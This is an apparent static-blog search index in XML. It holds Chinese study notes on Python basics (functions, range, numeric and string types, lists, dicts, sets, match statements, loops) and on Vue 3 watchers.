<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python函数</title>
    <url>/20231108/c8f562d1.html</url>
    <content><![CDATA[定义函数
在Python中，定义一个函数要使用def语句，依次写出函数名、括号、括号中的参数和冒号:，然后，在缩进块中编写函数体，函数的返回值用return语句返回。
def my_abs(x):    if x &gt;= 0:        return x    else:        return -x

函数体内部的语句在执行时，一旦执行到return时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。
如果没有return语句，函数执行完毕后也会返回结果，只是结果为None。return None可以简写为return。

如果你已经把my_abs()的函数定义保存为abstest.py文件了，那么，可以在该文件的当前目录下启动Python解释器，用from abstest import my_abs来导入my_abs()函数，注意abstest是文件名（不含.py扩展名）：
函数定义详解
函数定义支持可变数量的参数。这里列出三种可以组合使用的形式。
默认值参数
为参数指定默认值是非常有用的方式。调用函数时，可以使用比定义时更少的参数，例如：
]]></content>
      <categories>
        <category>后端</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>侦听器（watch）</title>
    <url>/20231224/1954b1ff.html</url>
    <content><![CDATA[https://cn.vuejs.org/guide/essentials/watchers.html
侦听对象为data中定义的响应式数据+组件数据
计算属性允许我们声明性地计算衍生值。
然而在有些情况下，我们需要在状态变化时执行一些“其他操作”：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态。
基本示例
在选项式 API 中，我们可以使用 watch 选项在每次响应式属性发生变化时触发一个函数。
export default {    data() {        return {            question: '',            answer: 'Questions usually contain a question mark. ;-)'        }    },    methods: {        async getAnswer() {            this.answer = 'Thinking...'            try {                const res = await fetch('https://yesno.wtf/api')                this.answer = (await res.json()).answer            } catch (error) {                this.answer = 'Error! Could not reach the API. ' + error            }        }    },    watch: {        // 每当 question 改变时，这个函数就会执行，从而回去对应的answer        question(newQuestion, oldQuestion) {            if (newQuestion.includes('?')) {                this.getAnswer()            }        }    },}

watch中定义的函数名称必须和侦听的数据对象一致。

深层侦听器
export default {  watch: {    // 注意：只能是简单的路径，不支持表达式。    'some.nested.key'(newValue) {      // ...    }  }}
export default {  watch: {    someObject: {      handler(newValue, oldValue) {        // 注意：在嵌套的变更中，        // 只要没有替换对象本身，        // 那么这里的 `newValue` 和 `oldValue` 相同      },      deep: true    }  }}
即时回调的侦听器
watch 默认是懒执行的：仅当数据源变化时，才会执行回调。但在某些场景中，我们希望在创建侦听器时，立即执行一遍回调。
举例来说，我们想请求一些初始数据，然后在相关状态更改时重新请求数据。
我们可以用一个对象来声明侦听器，这个对象有 handler 方法和 immediate: true 选项，这样便能强制回调函数立即执行：
export default {  // ...  watch: {    question: {      handler(newQuestion) {        // 在组件实例创建时会立即调用      },      // 强制立即执行回调      immediate: true    }  }  // ...}
回调函数的初次执行就发生在 created 钩子之前。Vue 此时已经处理了 data、computed 和 methods 选项，所以这些属性在第一次调用时就是可用的。
回调的触发时机
当你更改了响应式状态，它可能会同时触发 Vue 组件更新和侦听器回调。
默认情况下，用户创建的侦听器回调，都会在 Vue 组件更新之前被调用。这意味着你在侦听器回调中访问的 DOM 将是被 Vue 更新之前的状态。
如果想在侦听器回调中能访问被 Vue 更新之后的 DOM，你需要指明 flush: 'post' 选项：
export default {  // ...  watch: {    key: {      handler() {},      flush: 'post'    }  }}
created：  this.$watch()
我们也可以使用组件实例的 $watch() 方法来命令式地创建一个侦听器：
export default {  created() {    this.$watch('question', (newQuestion) =&gt; {      // ...    })  }}
如果要在特定条件下设置一个侦听器，或者只侦听响应用户交互的内容，这方法很有用。它还允许你提前停止该侦听器。
停止侦听器
用 watch 选项或者 $watch() 实例方法声明的侦听器，会在宿主组件卸载时自动停止。因此，在大多数场景下，你无需关心怎么停止它。
在少数情况下，你的确需要在组件卸载之前就停止一个侦听器，这时可以调用 $watch() API 返回的函数：
const unwatch = this.$watch('foo', callback)// ...当该侦听器不再需要时unwatch()
数组变化的侦测
变更方法：原数组发生变化，UI自动更新

push()
pop()
shift()
unshift()
splice()
sort()
reverse()

替换一个数组：原数组不发生变化，UI无法自动更新

fliter()
concat()
slice()

]]></content>
      <categories>
        <category>前端</category>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python内置函数</title>
    <url>/20231106/d59aed63.html</url>
    <content><![CDATA[range()
内置函数 range() 用于生成等差数列：


定义
class range(stop)
class range(start, stop[, step])


例子
list(range(10))[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]list(range(1, 11))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]list(range(0, 30, 5))[0, 5, 10, 15, 20, 25]list(range(0, 10, 3))[0, 3, 6, 9]list(range(0, -10, -1))[0, -1, -2, -3, -4, -5, -6, -7, -8, -9]list(range(0))[]list(range(1, 0))[]


说明
range() 返回的对象在很多方面和列表的行为一样，但其实它和列表不一样。该对象只有在被迭代时才一个一个地返回所期望的列表项，并没有真正生成过一个含有全部项的列表，从而节省了空间。


type()
isinstance()
]]></content>
      <categories>
        <category>后端</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础</title>
    <url>/20231106/99832f47.html</url>
    <content><![CDATA[语法
编码声明
# -*- coding: utf-8 -*-
运算符
运算符列表
+       -       *       **      /       //      %      @&lt;&lt;      &gt;&gt;      &amp;       |       ^       ~       :=&lt;       &gt;       &lt;=      &gt;=      ==      !=



符号
说明
示例




+
加法



-
减法



*
乘法



/
除法，总是返回浮点数



x ** y
x 的 y 次幂
&gt;&gt;&gt; 5 ** 2 25


x // y
x 除以 y 的商数
&gt;&gt;&gt; 5 // 2 2


x % 5
x 除以 y 的余数



-x
x 取反



+x
x 不变




交互模式下，上次输出的表达式会赋给变量 _。把 Python 当作计算器时，用该变量实现下一步计算更简单，例如：
 &gt;&gt;&gt; tax = 12.5 / 100&gt;&gt;&gt; price = 100.50&gt;&gt;&gt; price * tax12.5625&gt;&gt;&gt; price + _113.0625&gt;&gt;&gt; round(_, 2)113.06
最好把该变量 _当作只读类型。不要为它显式赋值，否则会创建一个同名独立局部变量，该变量会用它的魔法行为屏蔽内置变量。
分隔符
以下形符在语法中为分隔符：
(       )       [       ]       {       },       :       .       ;       @       =       -&gt;+=      -=      *=      /=      //=     %=      @=&amp;=      |=      ^=      &gt;&gt;=     &lt;&lt;=     **=
句点也可以用于浮点数和虚数字面值。
三个连续句点表示省略符。
列表后半部分是增强赋值操作符，用作词法分隔符，但也可以执行运算。
以下 ASCII 字符具有特殊含义，对词法分析器有重要意义：
 '       "       #       \
以下 ASCII 字符不用于 Python。在字符串字面值或注释外使用时，将直接报错：
$       ?       `
关键字
关键字、软关键字、保留的标识符类
关键字
False      await      else       import     passNone       break      except     in         raiseTrue       class      finally    is         returnand        continue   for        lambda     tryas         def        from       nonlocal   whileassert     del        global     not        withasync      elif       if         or         yield
软关键字
某些标识符仅在特定上下文中被保留。 它们被称为 软关键字。
match, case 和 _ 等标识符在模式匹配语句相关的上下文中具有相当于关键字的语义，但这种区分是在解析器层级完成，而不是在形符化的时候。
作为软关键字，它们能够与模式匹配一起使用，同时仍然保持与使用 match, case 和 _ 作为标识符名称的现有代码的兼容性。
保留的标识符类
某些标识符类（除了关键字）具有特殊含义。这些类的命名模式以下划线字符开头，并以下划线结尾：



标识符
说明




_*
不会被 from module import * 所导入。


_
在 match 语句内部的 case 模式中，_ 是一个 软关键字，它表示 通配符。在此之外，交互式解释器会将最后一次求值的结果放到变量 _ 中。 （它与 print 等内置函数一起被存储于 builtins 模块。）在其他地方，_ 是一个常规标识符。 它常常被用来命名 “特殊” 条目，但对 Python 本身来说毫无特殊之处。如_ 常用于连接国际化文本；详见 gettext 模块文档。它还经常被用来命名无需使用的变量。


__*__
系统定义的名称，通常简称为 “dunder” 。这些名称由解释器及其实现（包括标准库）定义。现有系统定义名称相关的论述详见 特殊方法名称 等章节。Python 未来版本中还将定义更多此类名称。任何情况下，任何 不显式遵从 __*__ 名称的文档用法，都可能导致无警告提示的错误。


__*
类的私有名称。类定义时，此类名称以一种混合形式重写，以避免基类及派生类的 “私有” 属性之间产生名称冲突。详见 标识符（名称）。



数据类型和变量
Python3 中常见的数据类型有：

Number（数字）
String（字符串）
bool（布尔类型）
List（列表）
Tuple（元组）
Set（集合）
Dictionary（字典）

Python3 的六个标准数据类型中：

**不可变数据（3 个）：**Number（数字）、String（字符串）、Tuple（元组）；
**可变数据（3 个）：**List（列表）、Dictionary（字典）、Set（集合）。

此外还有一些高级的数据类型，如: 字节数组类型(bytes)。
整数:int
Python允许在数字中间以_分隔，因此，写成10_000_000_000和10000000000是完全一样的
# 交互窗口输入（默认10进制）&gt;&gt;&gt; int(input('输入数字：')) 输入数字：123123# 指定2进制数据转化为10进制&gt;&gt;&gt; int('11', 2) 3
浮点数
 float
如果该参数是一个字符串，在去除前导和尾随的空格之后，输入必须为符合以下语法的 floatvalue 产生规则:
sign &nbsp; &nbsp; &nbsp;  ::= &nbsp;"+" | "-"infinity &nbsp;  ::= &nbsp;"Infinity" | "inf"nan &nbsp; &nbsp; &nbsp; &nbsp; ::= &nbsp;"nan"digitpart &nbsp; ::= &nbsp;digit (["_"] digit)*number &nbsp; &nbsp;  ::=  [digitpart] "." digitpart | digitpart ["."]exponent &nbsp;  ::=  ("e" | "E") ["+" | "-"] digitpartfloatnumber ::= &nbsp;number [exponent]floatvalue  ::=  [sign] (floatnumber | infinity | nan)



符号标记
说明
示例




sign ::= “+”
正，负
&gt;&gt;&gt; float(‘+1.23’) 1.23&gt;&gt;&gt; float(‘-1.23\n’)  -1.23&gt;&gt;&gt; float(‘-123\n’)   -123.0


(“e” | “E”) [“+” | “-”] 数字部分
科学计数
&gt;&gt;&gt; float(1e3)1000.0 &gt;&gt;&gt; float(‘1e3’)1000.0 &gt;&gt;&gt; float(‘1e+3’)1000.0 &gt;&gt;&gt; float(‘+1e3’)1000.0 &gt;&gt;&gt; float(‘-1e3’)-1000.0 &gt;&gt;&gt; float(‘1e-3’)0.001 &gt;&gt;&gt; float(1e-3)0.001 &gt;&gt;&gt; float(1E-3)0.001


infinity ::= “Infinity” | “inf”
无穷大1. 大小写不敏感2.  需要为字符串，否则会报错
&gt;&gt;&gt; float(‘Infinity’)inf&gt;&gt;&gt; float(‘InfinitY’)inf&gt;&gt;&gt; float(‘-Inf’)-inf


not-a-number
NaN1. 大小写不敏感2. 需要为字符串，否则会报错
&gt;&gt;&gt; float(‘NAN’)nan&gt;&gt;&gt; float(‘NaN’)nan&gt;&gt;&gt; float(‘-nan’)nan



complex ：复数
后缀 j 或 J 用于表示虚数（例如 3+5j ）




说明
示例




complex(re, im)
一个带有实部 re 和虚部 im 的复数。 im 默认为0
&gt;&gt;&gt; complex(3, 2)(3+2j)


c.conjugate()
复数 c 的共轭
&gt;&gt;&gt; complex(3, 2).conjugate()(3-2j)



Decimal：十进制浮点运算
class decimal.Decimal(value=‘0’, context=None)
value 可以是整数，字符串，元组，float ，或另一个 Decimal 对象。 如果没有给出 value，则返回 Decimal('0')。
如果 value 是一个字符串，它应该在前导和尾随空格字符以及下划线被删除之后符合十进制数字字符串语法
&gt;&gt;&gt; from decimal import *# 因为浮点数据的不准确性&gt;&gt;&gt; Decimal(1.2)Decimal('1.1999999999999999555910790149937383830547332763671875')# 通过设定有效数字，限定结果样式，保留六个有效数字&gt;&gt;&gt; getcontext().prec = 6&gt;&gt;&gt; Decimal(1)/Decimal(7)Decimal('0.142857')&gt;&gt;&gt; Decimal(1000)/Decimal(7) Decimal('142.857')# 四舍五入，保留两位小数&gt;&gt;&gt; Decimal('50.5679').quantize(Decimal('0.00'))Decimal('50.57')&gt;&gt;&gt; Decimal('50.5').quantize(Decimal('0.00')) &nbsp; &nbsp;Decimal('50.50')# Decimal 结果转化为string&gt;&gt;&gt; str(Decimal('50.5679').quantize(Decimal('0.00'))) &nbsp;'50.57'
取整问题：ROUND_CEILING 总是趋向无穷大向上取整ROUND_DOWN　总是趋向0取整ROUND_FLOOR 总是趋向负无穷大向下取整ROUND_HALF_DOWN　如果最后一个有效数字大于或等于5则朝0反方向取整；否则，趋向0取整ROUND_HALF_EVEN　类似于ROUND_HALF_DOWN，不过，如果最后一个有效数字值为5，则会检查前一位。偶数值会导致结果向下取整，奇数值导致结果向上取整ROUND_HALF_UP 类似于ROUND_HALF_DOWN，不过如果最后一位有效数字为5，值会朝0的反方向取整ROUND_UP　朝0的反方向取整ROUND_05UP　如果最后一位是0或5，则朝0的反方向取整；否则向0取整
fractions — 分数
&gt;&gt;&gt; from fractions import Fraction&gt;&gt;&gt; Fraction('1/3')*Fraction('3/1') Fraction(1, 1)&gt;&gt;&gt; int(Fraction('1/3')*Fraction('3/1'))1&gt;&gt;&gt; int(Fraction('1/3')*Fraction('6/2')) &nbsp; 1&gt;&gt;&gt; int(Fraction('1/3')*Fraction('6/1'))2&gt;&gt;&gt; Fraction(16, -10)Fraction(-8, 5)&gt;&gt;&gt; Fraction(-8, 5)Fraction(-8, 5)&gt;&gt;&gt; Fraction(123)Fraction(123, 1)&gt;&gt;&gt; Fraction(123, 1)Fraction(123, 1)&gt;&gt;&gt; Fraction()Fraction(0, 1)&gt;&gt;&gt; Fraction(0, 1)Fraction(0, 1)&gt;&gt;&gt; Fraction('3/7')Fraction(3, 7)&gt;&gt;&gt; Fraction(3, 7)Fraction(3, 7)&gt;&gt;&gt; Fraction(' -3/7 ')Fraction(-3, 7)&gt;&gt;&gt; Fraction(-3, 7)Fraction(-3, 7)&gt;&gt;&gt; Fraction('1.414213 \t\n')Fraction(1414213, 1000000)&gt;&gt;&gt; Fraction(1414213, 1000000)Fraction(1414213, 1000000)&gt;&gt;&gt; Fraction('-.125')Fraction(-1, 8)&gt;&gt;&gt; Fraction(-1, 8)Fraction(-1, 8)&gt;&gt;&gt; Fraction('7e-6')Fraction(7, 1000000)&gt;&gt;&gt; Fraction(7, 1000000)Fraction(7, 1000000)&gt;&gt;&gt; Fraction(2.25)Fraction(9, 4)&gt;&gt;&gt; Fraction(9, 4)Fraction(9, 4)&gt;&gt;&gt; Fraction(1.1)Fraction(2476979795053773, 2251799813685248)&gt;&gt;&gt; Fraction(2476979795053773, 2251799813685248)Fraction(2476979795053773, 2251799813685248)&gt;&gt;&gt; from decimal import Decimal&gt;&gt;&gt; Fraction(Decimal('1.1'))Fraction(11, 10)&gt;&gt;&gt; Fraction(11, 10)Fraction(11, 10)&gt;&gt;&gt;
字符串：String
可以用成对的单引号、双引号、三重引号来表示
字符串由str 类型表示。


如果不希望前置 \ 的字符转义成特殊字符，可以使用 原始字符串，在引号前添加 r 即可：
&gt;&gt;&gt; print('C:\some\name')C:\someame&gt;&gt;&gt; print(r'C:\some\name')C:\some\name&gt;&gt;&gt; ll = str(12)      &gt;&gt;&gt; ll'12'


原始字符串还有一个微妙的限制：一个原始字符串不能以奇数个 \ 字符结束
以奇数个反斜杠结尾的原始字符串将会转义用于标记字符串的引号
请参阅 此 FAQ 条目 了解更多信息及绕过的办法。


字符串字面值可以多行。使用三重引号：“”“…”“” 或 ‘’‘…’‘’


格式化字符串
占位符
用%实现。当%作为普通字符时，用%%来表示一个%
# 只有一个占位符，括号可以省略&gt;&gt;&gt; 'Hello, %s' % 'world''Hello, world'&gt;&gt;&gt; 'Hi, %s, you have $%d.' % ('Michael', 1000000)'Hi, Michael, you have $1000000.'&gt;&gt;&gt; print('Hi, %s, you have $%d. %f' % ('Michael', 1000000, True))Hi, Michael, you have $1000000. 1.000000&gt;&gt;&gt; print('percent: %d%%' % 1) &nbsp;percent: 1%&gt;&gt;&gt; print('percent: %.2f%%' % 1.345)  percent: 1.34%&gt;&gt;&gt; print('percent: %.2f%%' % 1.346) percent: 1.35%
常见的占位符有：



符号
说明




%d
整数


%f
浮点数


%s
%s会把任何数据类型转换为字符串


%x
十六进制整数



# 指定浮点数的小数位数，不足补0，超出四舍五入&gt;&gt;&gt; print('%0.4f' % 3.1415926)3.1416&gt;&gt;&gt; print('%.2f' % 3.1415926)3.14# 指定浮点数的小数位数，不足补0&gt;&gt;&gt; print('%.4f' % 3.1)3.1000# 指定整数的最小占位数，不足补空格&gt;&gt;&gt; print('%2d' % 1) 1# 指定整数的最小占位数，不足补0&gt;&gt;&gt; print('%02d'%1)01
f-string：格式字符串字面值
是使用以f开头的字符串，称之为f-string，它和普通字符串不同之处在于，字符串如果包含{xxx}，就会以对应的变量替换.
指定了转换符时，表达式求值的结果会先转换，再格式化。转换符 '!s' 调用 str() 转换求值结果，'!r' 调用 repr()，'!a' 调用 ascii()。
&gt;&gt;&gt; r = 2.5&gt;&gt;&gt; s = 3.14 * r ** 2&gt;&gt;&gt; print(f'The area of a circle with radius {r} is {s:.2f}')The area of a circle with radius 2.5 is 19.62#使用'!r'&gt;&gt;&gt; name = "Fred"&gt;&gt;&gt; f"He said his name is {name!r}.""He said his name is 'Fred'."&gt;&gt;&gt; f"He said his name is {name}."   'He said his name is Fred.'&gt;&gt;&gt; import decimal&gt;&gt;&gt; width = 10&gt;&gt;&gt; precision = 4&gt;&gt;&gt; value = decimal.Decimal("12.34567") &gt;&gt;&gt; f"result: {value:{width}.{precision}}"'result:      12.35'&gt;&gt;&gt; number = 15 &gt;&gt;&gt; f"{number:#0x}" '0xf'# 格式化日期&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; today = datetime(year=2017, month=1, day=27)&gt;&gt;&gt; f"{today:%B %d, %Y}"'January 27, 2017'&gt;&gt;&gt; f"{today=:%B %d, %Y}" 'today=January 27, 2017'&gt;&gt;&gt; line = "The mill's closed"&gt;&gt;&gt; f"{line}"    "The mill's closed"&gt;&gt;&gt; f"{line=}" 'line="The mill\'s closed"'&gt;&gt;&gt; f"{line = :20}""line = The mill's closed   "&gt;&gt;&gt; f"{line = !r:20}"'line = "The mill\'s closed" '
format()
使用字符串的format()方法，它会用传入的参数依次替换字符串内的占位符{0}、{1}……
内置函数



函数
说明




len(‘asd’)
计算的是str的字符数，如果换成bytes，len()函数就计算字节数


ord(‘A’)
返回单个字符的整数编码


chr(‘32’)
整数编码转换为对应的字符


‘ABC’.encode(‘ascii’)
str转bytes


b’ABC’.decode(‘ascii’)
bytes转str



















布尔值：Bool
区分大小写
&gt;&gt;&gt; not TrueFalse&gt;&gt;&gt; not FalseTrue&gt;&gt;&gt; not 1 &gt; 2True&gt;&gt;&gt; 5 &gt; 3 and 3 &gt; 1True
空值：None
空值是Python里一个特殊的值，用None表示。None不能理解为0，因为0是有意义的，而None是一个特殊的空值。
列表：List
list是一种有序的集合，可以随时添加和删除其中的元素。可以包含不同类型的元素。列表支持索引和切片查询


定义
&gt;&gt;&gt; letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']# 嵌套列表（创建包含其他列表的列表）&gt;&gt;&gt; a = ['a', 'b', 'c']&gt;&gt;&gt; n = [1, 2, 3]&gt;&gt;&gt; x = [a, n]&gt;&gt;&gt; x[['a', 'b', 'c'], [1, 2, 3]]&gt;&gt;&gt; x[0]['a', 'b', 'c']&gt;&gt;&gt; x[0][1]'b'


添加
# 末尾追加元素&gt;&gt;&gt; letters = ['a', 'b', 'f', 'g']&gt;&gt;&gt; letters.append('h') &gt;&gt;&gt; letters['a', 'b', 'f', 'g', 'h']&gt;&gt;&gt; letters += 'i'      &gt;&gt;&gt; letters['a', 'b', 'f', 'g', 'h', 'i']# 把元素插入到指定的位置&gt;&gt;&gt; letters  ['a', 'b', 'f', 'g', 'h', 'i']&gt;&gt;&gt; letters.insert(2, 'c') &gt;&gt;&gt; letters['a', 'b', 'c', 'f', 'g', 'h', 'i']# 合并操作&gt;&gt;&gt; letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']          &gt;&gt;&gt; letters += ['h', 'i'] &gt;&gt;&gt; letters['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i']


修改
&gt;&gt;&gt; letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']# 修改元素&gt;&gt;&gt; letters[2:5]['c', 'd', 'e']&gt;&gt;&gt; letters[2:5] = ['C', 'D', 'E'] &gt;&gt;&gt; letters[2:5] ['C', 'D', 'E']&gt;&gt;&gt; letters     ['a', 'b', 'C', 'D', 'E', 'f', 'g']


删除
&gt;&gt;&gt; letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g']# 切片删除元素&gt;&gt;&gt; letters[2:5] = []&gt;&gt;&gt; letters          ['a', 'b', 'f', 'g']# 删除末尾元素&gt;&gt;&gt; letters          ['a', 'b', 'f', 'g']&gt;&gt;&gt; letters.pop()    'g'&gt;&gt;&gt; letters['a', 'b', 'f']# 删除指定位置元素&gt;&gt;&gt; letters.pop(1) 'b'&gt;&gt;&gt; letters        ['a', 'f']


元组：Tuple
有序、不可变


定义
# 普通定义&gt;&gt;&gt; classmates = ('Michael', 'Bob', 'Tracy')# 空&gt;&gt;&gt; classmates = ()# 一个元素（歧义）&gt;&gt;&gt; test = ('test') &gt;&gt;&gt; test'test'# 一个元素（元组定义）&gt;&gt;&gt; test = ('test',) &gt;&gt;&gt; test('test',)


只有1个元素的tuple定义时必须加一个逗号,，来消除歧义。而显示时，也会带上一个逗号, 


“可变的”tuple：
&gt;&gt;&gt; t = ('a', 'b', ['A', 'B'])&gt;&gt;&gt; t[2][0] = 'X'&gt;&gt;&gt; t[2][1] = 'Y'&gt;&gt;&gt; t('a', 'b', ['X', 'Y']) 
当我们把list的元素'A'和'B'修改为'X'和'Y'后，tuple变为：
表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。
tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向'a'，就不能改成指向'b'，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的。
理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。


字典：Dictionary
Python内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。


定义和赋值
&gt;&gt;&gt; d = {}&gt;&gt;&gt; d{}&gt;&gt;&gt; d['Jack'] = 90&gt;&gt;&gt; d{'Jack': 90}&gt;&gt;&gt; d['Jack'] = 88&gt;&gt;&gt; d{'Jack': 88}&gt;&gt;&gt; 
&gt;&gt;&gt; f = dict  &gt;&gt;&gt; f&lt;class 'dict'&gt;&gt;&gt;&gt; f = dict()&gt;&gt;&gt; f{}
如果key不存在，dict就会报错：
&gt;&gt;&gt; d['Thomas']Traceback (most recent call last):  File "&lt;stdin&gt;", line 1, in &lt;module&gt;KeyError: 'Thomas'
要避免key不存在的错误，有两种办法，一是通过in判断key是否存在：
&gt;&gt;&gt; 'Thomas' in dFalse
二是通过dict提供的get()方法，如果key不存在，可以返回None，或者自己指定的value：
&gt;&gt;&gt; d.get('Thomas')&gt;&gt;&gt; d.get('Thomas', -1)-1
注意：返回None的时候Python的交互环境不显示结果。
要删除一个key，用pop(key)方法，对应的value也会从dict中删除，如果key不存在，一样会报错：
&gt;&gt;&gt; d.pop('Bob')75&gt;&gt;&gt; d{'Michael': 95, 'Tracy': 85}&gt;&gt;&gt; 'Bob' in dFalse&gt;&gt;&gt; d.pop('Bob') Traceback (most recent call last):  File "&lt;stdin&gt;", line 1, in &lt;module&gt;KeyError: 'Bob'


集合：Set
set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。
要创建一个set，需要提供一个list作为输入集合：
&gt;&gt;&gt; s = set([1, 2, 3])&gt;&gt;&gt; s{1, 2, 3}
注意，传入的参数[1, 2, 3]是一个list，而显示的{1, 2, 3}只是告诉你这个set内部有1，2，3这3个元素，显示的顺序也不表示set是有序的。
重复元素在set中自动被过滤：
&gt;&gt;&gt; s = set([1, 1, 2, 2, 3, 3])&gt;&gt;&gt; s{1, 2, 3}
通过add(key)方法可以添加元素到set中，可以重复添加，但不会有效果：
&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s{1, 2, 3, 4}&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s{1, 2, 3, 4}
通过remove(key)方法可以删除元素：
&gt;&gt;&gt; s.remove(4)&gt;&gt;&gt; s{1, 2, 3}
set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：
&gt;&gt;&gt; s1 = set([1, 2, 3])&gt;&gt;&gt; s2 = set([2, 3, 4])&gt;&gt;&gt; s1 &amp; s2{2, 3}&gt;&gt;&gt; s1 | s2{1, 2, 3, 4}
set和dict的唯一区别仅在于没有存储对应的value，但是，set的原理和dict一样，所以，同样不可以放入可变对象，因为无法判断两个可变对象是否相等，也就无法保证set内部“不会有重复元素”。
&gt;&gt;&gt; ll = {(1, 2, 3), 4} &gt;&gt;&gt; ll{(1, 2, 3), 4}&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ll = {(1, [2, 3]), 4} Traceback (most recent call last):  File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: unhashable type: 'list'
控制流工具
if 语句
完整结构
if &lt;条件判断1&gt;:    &lt;执行1&gt;elif &lt;条件判断2&gt;:    &lt;执行2&gt;elif &lt;条件判断3&gt;:    &lt;执行3&gt;else:    &lt;执行4&gt;
if判断条件还可以简写，比如写：
if x:    print('True')
只要x是非零数值、非空字符串、非空list等，就判断为True，否则为False
match 语句
版本3.10之后支持
模式匹配：只有第一个匹配的模式会被执行，并且它还可以提取值的组成部分（序列的元素或对象的属性）赋给变量。
字面值匹配
最简单的形式是将一个主语值与一个或多个字面值进行比较：
def http_error(status):    match status:        case 400:            return "Bad request"        case 401 | 403 | 404:            return "Not allowed"        case 404:            return "Not found"        case 418:            return "I'm a teapot"        case _:            return "Something's wrong with the internet"
注意最后一个代码块：“变量名” _ 被作为 通配符 并必定会匹配成功。
如果没有 case 匹配成功，则不会执行任何分支。
你可以使用 | （“ or ”）在一个模式中组合几个字面值
case 401 | 403 | 404:    return "Not allowed"
在case中使用判断语句
match语句还支持在分支条件中插入判断语句
a = (2, 2)flag = Falsematch a:    case (1, 2):        print('case 1')    case (2, x) if flag:        print('case 2', x)    case default:        print('case default', default)
解包赋值
match语句除了可以匹配简单的单个值外，还可以匹配多个值、匹配一定范围，并且把匹配后的值绑定到变量：
# point is an (x, y) tuplematch point:    case (0, 0):        print("Origin")    case (0, y):        print(f"Y={y}")    case (x, 0):        print(f"X={x}")    case (x, y):        print(f"X={x}, Y={y}")    case _:        raise ValueError("Not a point")
class Point:    def __init__(self, x, y):        self.x = x        self.y = ydef where_is(point):    match point:        case Point(x=0, y=0):            print("原点")        case Point(x=0, y=yLine):            print(f"Y轴：Y={yLine}")        case Point(x=xLine, y=0):            print(f"X轴：X={xLine}")        case Point():            print("Somewhere else")        case _:            print("Not a point")where_is(Point(0, 3))
序列模式
与解包赋值类似，元组和列表模式具有完全相同的含义并且实际上都能匹配任意序列，区别是它们不能匹配迭代器或字符串。
序列模式支持扩展解包：[x, y, *rest] 和 (x, y, *rest) 和相应的解包赋值做的事是一样的。接在 * 后的名称也可以为 _，所以 (x, y, *_) 匹配含至少两项的序列，而不必绑定剩余的项。
def match_list(s):    match s:        case None:            print("None")        case []:            print("Empty")        case [x]:            print("x={0}".format(x))        case [x, y]:            print("x={0},y={1}".format(x, y))        case [x, y, *rest]:            print("x=%s, y=%s, rest=%s" % (x, y, rest))        case _:            print("Not a list")match_list([1])match_list([1, 2])match_list([1, 2, 3, 4])match_list("s")# 输出x=1x=1,y=2x=1, y=2, rest=[3, 4]Not a list
映射模式
映射模式：{"bandwidth": b, "latency": l} 从字典中捕获 "bandwidth" 和 "latency" 的值。额外的键会被忽略，这一点与序列模式不同。**rest 这样的解包也支持。（但 **_ 将会是冗余的，故不允许使用。）
match实现
def dispatch_match(operator, x, y):    match operator:        case 'add':            return x + y        case 'sub':            return x - y        case 'mul':          return x * y        case 'div':            return x / y        case _:            return None                 print(dispatch_match('add', 1, 2))print(dispatch_match('test', 1, 2))# 输出结果3None
字典实现相同功能
def dispatch_dict(operator, x, y):    return {        'add': lambda: x + y,        'sub': lambda: x - y,        'mul': lambda: x * y,        'div': lambda: x / y,    }.get(operator, lambda: None)()  print(dispatch_dict('add', 1, 2))print(dispatch_dict('test', 1, 2))# 输出结果3None
循环


for 语句
for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句。
# Measure some strings:words = ['cat', 'window', 'defenestrate']for w in words:    print(w, len(w))
sum = 0for x in range(101):    sum = sum + xprint(sum)
p = {"a": 10, "b" : 20}for x in p:    print(x)    print(p[x])         # 输出a10b20
很难正确地在迭代多项集的同时修改多项集的内容。更简单的方法是迭代多项集的副本或者创建新的多项集：
# Create a sample collectionusers = {'Hans': 'active', 'Éléonore': 'inactive', '景太郎': 'active'}# Strategy:  Iterate over a copyfor user, status in users.copy().items():    if status == 'inactive':        del users[user]# Strategy:  Create a new collectionactive_users = {}for user, status in users.items():    if status == 'active':        active_users[user] = statuss


while循环
要条件满足，就不断循环，条件不满足时退出循环


循环中的 break、continue 语句及 else 子句


break 语句将跳出最近的一层 for 或 while 循环


for 或 while 循环可以包括 else 子句（完成循环之后执行）
在 for 循环中，else 子句会在循环成功结束最后一次迭代之后执行。
在 while 循环中，它会在循环条件变为假值后执行。
无论哪种循环，如果因为 break 而结束，那么 else 子句就 不会 执行。
